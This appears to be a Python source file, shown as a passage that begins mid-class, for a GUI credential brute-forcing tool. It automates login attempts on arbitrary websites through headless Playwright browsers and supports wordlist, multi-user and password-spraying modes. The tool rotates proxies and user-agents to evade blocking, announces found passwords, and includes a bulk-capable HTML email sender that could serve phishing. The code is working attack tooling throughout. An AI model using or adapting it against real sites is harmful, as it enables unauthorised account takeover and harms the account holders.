                                insertbackground=self.custom_colors["log_fg"])
        self.success_text_widget.configure(bg=self.custom_colors["log_bg"], fg=self.custom_colors["log_fg"],
                                           insertbackground=self.custom_colors["log_fg"])
        self.log_text.tag_configure("success", foreground=self.custom_colors["success_fg"])
        self.log_text.tag_configure("failure", foreground=self.custom_colors["failure_fg"])
        if self.proxy_check_result_text:
            self.proxy_check_result_text.configure(bg=self.custom_colors["log_bg"], fg=self.custom_colors["log_fg"])
        if self.email_log_text:
            self.email_log_text.configure(bg=self.custom_colors["log_bg"], fg=self.custom_colors["log_fg"])
        for lbl in self.stats_labels.values():
            lbl.configure(background=self.custom_colors["stats_bg"], foreground=self.custom_colors["stats_fg"])
        self.status_label.configure(background=self.custom_colors["stats_bg"], foreground=self.custom_colors["stats_fg"])
        # Update start/stop button styles
        self.style.configure("Pulse.TButton", background=self.custom_colors["button_bg"], foreground=self.custom_colors["button_fg"])
        self.style.configure("Rounded.TButton", background=self.custom_colors["button_bg"], foreground=self.custom_colors["button_fg"])
        # Recreate spinner with new colors
        if self.spinner_canvas:
            self.spinner_canvas.configure(bg=self.custom_colors["stats_bg"])
            if self.running:
                self.draw_spinner()

    # ---------- Logging ----------
    def format_log_entry(self, attempt_num, username, password, proxy_str, result, success=False):
        parts = []
        if self.log_fields["timestamp"].get():
            parts.append(datetime.now().strftime("%H:%M:%S"))
        if self.log_fields["attempt_num"].get():
            parts.append(f"[{attempt_num}]")
        if self.log_fields["username"].get():
            parts.append(username)
        if self.log_fields["password"].get():
            parts.append(password)
        if self.log_fields["proxy"].get():
            parts.append(proxy_str if proxy_str else "direct")
        if self.log_fields["result"].get():
            parts.append("SUCCESS" if success else "FAILED")
        return " | ".join(parts)

    # ---------- Attack Execution ----------
    def update_gui(self):
        while not self.log_queue.empty():
            msg, success = self.log_queue.get_nowait()
            if success:
                self.log_text.insert(tk.END, msg + "\n", "success")
            else:
                self.log_text.insert(tk.END, msg + "\n", "failure")
            self.log_text.see(tk.END)
        while not self.success_queue.empty():
            msg = self.success_queue.get_nowait()
            self.success_text_widget.insert(tk.END, msg + "\n")
            self.success_text_widget.see(tk.END)
        while not self.stats_queue.empty():
            stats = self.stats_queue.get_nowait()
            for key, value in stats.items():
                if key in self.stats_labels:
                    self.stats_labels[key].config(text=str(value))
            if self.total_attempts > 0 and "tested" in stats:
                self.tested_attempts = int(stats["tested"])
                self.progress_bar['value'] = (self.tested_attempts / self.total_attempts) * 100
        self.root.after(100, self.update_gui)

    def start_attack(self):
        if self.attack_mode.get() == "saved":
            if not self.selected_attack:
                messagebox.showerror("Error", "No saved profile selected.")
                return
            cfg = self.selected_attack
            login_url = cfg["url"]
            username_selector = f"input[{cfg['username_field_type']}='{cfg['username_field_selector']}']"
            password_selector = f"input[{cfg['password_field_type']}='{cfg['password_field_selector']}']"
            submit_selector = cfg["submit_button_selector"]
            success_indicator = cfg["success_indicator"]
            success_text = cfg["success_text"] if success_indicator == "text" else None
            failure_text = cfg.get("failure_text", "")
            timeout = cfg["timeout"]
        else:
            login_url = self.custom_url.get().strip()
            if not login_url:
                messagebox.showerror("Error", "Custom URL is empty.")
                return
            username_selector = f"input[{self.username_field_type.get()}='{self.username_field_selector.get()}']"
            password_selector = f"input[{self.password_field_type.get()}='{self.password_field_selector.get()}']"
            submit_selector = self.submit_button_selector.get()
            success_indicator = self.success_indicator.get()
            success_text = self.success_text.get().strip() if success_indicator == "text" else None
            failure_text = self.failure_text.get().strip()
            if not failure_text:
                messagebox.showerror("Error", "Failure message is required for detection.")
                return
            try:
                timeout = int(self.timeout_var.get())
            except:
                timeout = 5000

        # Load user-agents
        ua_list = []
        ua_file = self.useragent_path.get().strip()
        if ua_file and os.path.exists(ua_file):
            try:
                with open(ua_file, 'r', encoding='utf-8') as f:
                    ua_list = [line.strip() for line in f if line.strip()]
            except:
                pass

        # Credentials
        mode = self.mode.get()
        if mode == "single":
            username = self.username_single.get().strip()
            if not username:
                messagebox.showerror("Error", "Please enter a username.")
                return
            passlist = self.passlist_path.get().strip()
            if not passlist or not os.path.exists(passlist):
                messagebox.showerror("Error", "Invalid password list file.")
                return
            passwords = self.load_list(passlist)
            pairs = [(username, pwd) for pwd in passwords]
        elif mode == "multi":
            userlist = self.userlist_path.get().strip()
            passlist = self.passlist_path.get().strip()
            if not userlist or not os.path.exists(userlist):
                messagebox.showerror("Error", "Invalid username list file.")
                return
            if not passlist or not os.path.exists(passlist):
                messagebox.showerror("Error", "Invalid password list file.")
                return
            usernames = self.load_list(userlist)
            passwords = self.load_list(passlist)
            pairs = [(u, p) for u in usernames for p in passwords]
        elif mode == "reverse":
            userlist = self.userlist_path.get().strip()
            password = self.pass_single.get().strip()
            if not userlist or not os.path.exists(userlist):
                messagebox.showerror("Error", "Invalid username list file.")
                return
            if not password:
                messagebox.showerror("Error", "Please enter a password.")
                return
            usernames = self.load_list(userlist)
            pairs = [(u, password) for u in usernames]
        else:
            return

        # Proxy list
        proxy_list = []
        if self.use_proxy.get():
            proxy_file = self.proxy_path.get().strip()
            if not proxy_file or not os.path.exists(proxy_file):
                messagebox.showerror("Error", "Invalid proxy list file.")
                return
            proxy_list = self.load_list(proxy_file)
            if not proxy_list:
                messagebox.showerror("Error", "No proxies found.")
                return
            proxy_type = self.proxy_type.get()
        else:
            proxy_list = None
            proxy_type = None

        self.attempt_queue = queue.Queue()
        for pair in pairs:
            self.attempt_queue.put(pair)
        self.total_attempts = len(pairs)
        self.tested_attempts = 0

        self.log_text.delete(1.0, tk.END)
        self.success_text_widget.delete(1.0, tk.END)
        self.stats_labels["total"].config(text=str(self.total_attempts))
        self.stats_labels["tested"].config(text="0")
        self.stats_labels["rotations"].config(text="0")
        self.stats_labels["current_proxy"].config(text="--")
        self.stats_labels["elapsed"].config(text="0s")
        self.stats_labels["remaining"].config(text=str(self.total_attempts))
        self.stats_labels["status"].config(text="Starting...")

        self.running = True
        self.stop_flag.clear()
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)

        self.stop_button_pulse()
        self.progress_bar['value'] = 0
        self.progress_bar.pack(side=tk.RIGHT, padx=5)
        self.start_spinner()

        num_browsers = max(1, min(self.num_browsers.get(), 10))

        self.attack_thread = threading.Thread(target=self.run_attack,
                                              args=(proxy_list, proxy_type, self.show_browser.get(), num_browsers,
                                                    login_url, username_selector, password_selector, submit_selector,
                                                    success_indicator, success_text, failure_text, timeout, ua_list),
                                              daemon=True)
        self.attack_thread.start()

    def stop_attack(self):
        self.stop_flag.set()
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.progress_bar.pack_forget()
        self.stop_spinner()
        self.status_label.config(text="Stopped")
        self.start_button_pulse()

    def load_list(self, path):
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []

    def construct_proxy_dict(self, proxy_line, proxy_type):
        if not proxy_line:
            return None
        if proxy_line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            return {"server": proxy_line}
        if proxy_type == 'http':
            return {"server": f"http://{proxy_line}"}
        elif proxy_type == 'socks4':
            return {"server": f"socks4://{proxy_line}"}
        else:
            return {"server": f"socks5://{proxy_line}"}

    def run_attack(self, proxy_list, proxy_type, show_browser, num_browsers,
                   login_url, username_selector, password_selector, submit_selector,
                   success_indicator, success_text, failure_text, timeout, ua_list):
        headless = not show_browser
        attempt_counter = 0
        proxy_index = 0
        start_time = time.time()
        found = False
        found_password = None
        found_username = None
        self.lock_proxy = threading.Lock()

        def worker(worker_id):
            nonlocal attempt_counter, proxy_index, found, found_password, found_username
            playwright = sync_playwright().start()
            my_proxy_index = proxy_index
            if proxy_list and self.use_proxy.get():
                proxy_str = proxy_list[my_proxy_index % len(proxy_list)]
                proxy = self.construct_proxy_dict(proxy_str, proxy_type)
            else:
                proxy = None
                proxy_str = "direct"
            ua = random.choice(ua_list) if ua_list else None
            browser = playwright.chromium.launch(
                headless=headless,
                proxy=proxy,
                args=[f"--window-position={worker_id*400},0"]
            )
            context = browser.new_context(user_agent=ua)
            page = context.new_page()

            try:
                while not self.stop_flag.is_set() and not found:
                    with self.lock_proxy:
                        current_proxy_index = proxy_index
                    if current_proxy_index != my_proxy_index:
                        browser.close()
                        playwright.stop()
                        my_proxy_index = current_proxy_index
                        if proxy_list and self.use_proxy.get():
                            proxy_str = proxy_list[my_proxy_index % len(proxy_list)]
                            proxy = self.construct_proxy_dict(proxy_str, proxy_type)
                        else:
                            proxy = None
                            proxy_str = "direct"
                        ua = random.choice(ua_list) if ua_list else None
                        playwright = sync_playwright().start()
                        browser = playwright.chromium.launch(
                            headless=headless,
                            proxy=proxy,
                            args=[f"--window-position={worker_id*400},0"]
                        )
                        context = browser.new_context(user_agent=ua)
                        page = context.new_page()
                        continue

                    try:
                        username, password = self.attempt_queue.get(timeout=1)
                    except:
                        break

                    attempt_counter += 1
                    attempt_num = attempt_counter

                    self.stats_queue.put({
                        "tested": attempt_num,
                        "remaining": self.total_attempts - attempt_num,
                        "elapsed": f"{int(time.time() - start_time)}s",
                        "status": "Running"
                    })

                    try:
                        page.goto(login_url, wait_until="domcontentloaded")
                        try:
                            page.wait_for_selector(username_selector, timeout=5000)
                        except:
                            self.log_queue.put((f"[Browser {worker_id}] Timeout waiting for username field: {username_selector}", False))
                            continue

                        page.fill(username_selector, username, delay=25)
                        page.fill(password_selector, password, delay=30)
                        start_url = page.url

                        if submit_selector:
                            try:
                                page.click(submit_selector, timeout=3000)
                            except:
                                page.press(password_selector, "Enter")
                        else:
                            page.press(password_selector, "Enter")

                        # Check failure text first (if provided)
                        if failure_text:
                            try:
                                page.wait_for_selector(f"text='{failure_text}'", timeout=2000)
                                # Failure detected
                                log_entry = self.format_log_entry(attempt_num, username, password, proxy_str, "FAILED", success=False)
                                self.log_queue.put((log_entry, False))
                                continue
                            except PlaywrightTimeoutError:
                                pass  # No failure text, proceed to success check

                        # Check success
                        if success_indicator == "url_change":
                            try:
                                page.wait_for_url(lambda url: url != start_url and "login" not in url.lower(), timeout=timeout)
                                found = True
                                found_password = password
                                found_username = username
                                log_entry = self.format_log_entry(attempt_num, username, password, proxy_str, "SUCCESS", success=True)
                                self.log_queue.put((log_entry, True))
                                self.success_queue.put(log_entry)
                                self.stats_queue.put({"status": f"SUCCESS! Password: {password}"})
                                self.stop_flag.set()
                                break
                            except PlaywrightTimeoutError:
                                log_entry = self.format_log_entry(attempt_num, username, password, proxy_str, "FAILED", success=False)
                                self.log_queue.put((log_entry, False))
                        else:  # text indicator
                            try:
                                page.wait_for_selector(f"text='{success_text}'", timeout=timeout)
                                found = True
                                found_password = password
                                found_username = username
                                log_entry = self.format_log_entry(attempt_num, username, password, proxy_str, "SUCCESS", success=True)
                                self.log_queue.put((log_entry, True))
                                self.success_queue.put(log_entry)
                                self.stats_queue.put({"status": f"SUCCESS! Password: {password}"})
                                self.stop_flag.set()
                                break
                            except PlaywrightTimeoutError:
                                log_entry = self.format_log_entry(attempt_num, username, password, proxy_str, "FAILED", success=False)
                                self.log_queue.put((log_entry, False))
                    except Exception as e:
                        self.log_queue.put((f"[Browser {worker_id}] Error: {e}", False))
                    finally:
                        self.attempt_queue.task_done()
                        if attempt_num % 10 == 0 and proxy_list and self.use_proxy.get():
                            with self.lock_proxy:
                                proxy_index += 1
                                self.stats_queue.put({
                                    "rotations": proxy_index,
                                    "current_proxy": proxy_list[proxy_index % len(proxy_list)] if proxy_list else "None"
                                })
            finally:
                browser.close()
                playwright.stop()

        threads = []
        for i in range(num_browsers):
            t = threading.Thread(target=worker, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if found:
            self.stats_queue.put({"status": f"Finished - Password found for {found_username}: {found_password}"})
        else:
            self.stats_queue.put({"status": "Finished - No valid credentials found"})

        self.root.after(0, lambda: self.start_btn.config(state=tk.NORMAL))
        self.root.after(0, lambda: self.stop_btn.config(state=tk.DISABLED))
        self.root.after(0, lambda: self.progress_bar.pack_forget())
        self.root.after(0, lambda: self.stop_spinner())
        self.root.after(0, lambda: self.start_button_pulse())
        self.running = False

    # ---------- Proxy Checker ----------
    def test_proxy(self, proxy_line, proxy_type, timeout):
        try:
            if proxy_line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                proxy_url = proxy_line
            else:
                if proxy_type == 'http':
                    proxy_url = f"http://{proxy_line}"
                elif proxy_type == 'socks4':
                    proxy_url = f"socks4://{proxy_line}"
                else:
                    proxy_url = f"socks5://{proxy_line}"
            proxies = {'http': proxy_url, 'https': proxy_url}
            r = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=timeout)
            if r.status_code == 200:
                return (True, proxy_line, r.json().get('origin', 'unknown'))
            else:
                return (False, proxy_line, None)
        except Exception as e:
            return (False, proxy_line, str(e))

    def run_proxy_check(self, proxy_list, proxy_type, timeout, threads, result_queue):
        def worker(proxies_chunk, results):
            for proxy in proxies_chunk:
                ok, proxy_line, info = self.test_proxy(proxy, proxy_type, timeout)
                results.append((ok, proxy_line, info))

        import concurrent.futures
        chunk_size = max(1, len(proxy_list) // threads)
        chunks = [proxy_list[i:i+chunk_size] for i in range(0, len(proxy_list), chunk_size)]
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, chunk, results) for chunk in chunks]
            for f in futures:
                f.result()
        result_queue.put(results)

    def start_proxy_check(self):
        proxy_file = self.proxy_check_path.get().strip()
        if not proxy_file or not os.path.exists(proxy_file):
            messagebox.showerror("Error", "Invalid proxy list file.")
            return
        proxy_list = self.load_list(proxy_file)
        if not proxy_list:
            messagebox.showerror("Error", "No proxies found.")
            return
        proxy_type = self.proxy_type.get()
        timeout = self.proxy_timeout.get()
        threads = self.proxy_threads.get()

        self.proxy_check_btn.config(state=tk.DISABLED)
        self.proxy_check_result_text.delete(1.0, tk.END)
        self.proxy_check_result_text.insert(tk.END, "Checking proxies...\n")
        self.proxy_check_result_text.update()

        def check_thread():
            result_queue = queue.Queue()
            self.run_proxy_check(proxy_list, proxy_type, timeout, threads, result_queue)
            results = result_queue.get()
            self.root.after(0, lambda: self.display_proxy_results(results))
            self.root.after(0, lambda: self.proxy_check_btn.config(state=tk.NORMAL))

        t = threading.Thread(target=check_thread, daemon=True)
        t.start()

    def display_proxy_results(self, results):
        self.proxy_check_result_text.delete(1.0, tk.END)
        working = [r for r in results if r[0]]
        failed = [r for r in results if not r[0]]
        self.proxy_check_result_text.insert(tk.END, f"Total: {len(results)}\nWorking: {len(working)}\nFailed: {len(failed)}\n\n")
        self.proxy_check_result_text.insert(tk.END, "=== WORKING PROXIES ===\n")
        for ok, proxy_line, info in working:
            self.proxy_check_result_text.insert(tk.END, f"{proxy_line} -> {info}\n")
        self.proxy_check_result_text.insert(tk.END, "\n=== FAILED PROXIES ===\n")
        for ok, proxy_line, info in failed:
            self.proxy_check_result_text.insert(tk.END, f"{proxy_line} -> {info}\n")

    # ---------- Email Sender ----------
    def send_email(self):
        sender = self.email_sender.get().strip()
        password = self.email_password.get().strip()
        receiver = self.email_receiver.get().strip()
        html_file = self.email_html_path.get().strip()

        if not sender or not password or not receiver or not html_file:
            messagebox.showerror("Error", "All fields are required.")
            return
        if not os.path.exists(html_file):
            messagebox.showerror("Error", "HTML file not found.")
            return

        try:
            with open(html_file, 'r', encoding='utf-8') as f:
                html_content = f.read()
        except Exception as e:
            messagebox.showerror("Error", f"Could not read HTML file: {e}")
            return

        self.email_send_btn.config(state=tk.DISABLED)
        self.email_log_text.delete(1.0, tk.END)
        self.email_log_text.insert(tk.END, "Sending email...\n")
        self.email_log_text.update()

        def send():
            try:
                msg = MIMEMultipart("alternative")
                msg["Subject"] = "Important message"
                msg["From"] = sender
                msg["To"] = receiver
                msg.attach(MIMEText(html_content, "html"))

                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                    server.login(sender, password)
                    server.send_message(msg)
                self.root.after(0, lambda: self.email_log_text.insert(tk.END, "Email sent successfully!\n"))
            except Exception as e:
                self.root.after(0, lambda: self.email_log_text.insert(tk.END, f"Error: {e}\n"))
            finally:
                self.root.after(0, lambda: self.email_send_btn.config(state=tk.NORMAL))

        t = threading.Thread(target=send, daemon=True)
        t.start()


def verify_master_password():
    if os.path.exists(PASSWORD_FILE):
        with open(PASSWORD_FILE, 'r') as f:
            stored_hash = f.read().strip()
        pwd = simpledialog.askstring("Tool Lock", "Enter master password:", show='*')
        if pwd is None:
            return False
        if hashlib.sha256(pwd.encode()).hexdigest() == stored_hash:
            return True
        else:
            messagebox.showerror("Error", "Wrong password. Exiting.")
            return False
    else:
        pwd1 = simpledialog.askstring("Setup", "Set a master password:", show='*')
        
        if not pwd1:
            return False
        pwd2 = simpledialog.askstring("Setup", "Confirm password:", show='*')
        
        if pwd1 != pwd2:
            messagebox.showerror("Error", "Passwords do not match. Exiting.")
            return False
        with open(PASSWORD_FILE, 'w') as f:
            f.write(hashlib.sha256(pwd1.encode()).hexdigest())
        return True


if __name__ == "__main__":
    if not verify_master_password():
        exit(1)

    root = tk.Tk()
    app = BruteForceGUI(root)
    root.mainloop()
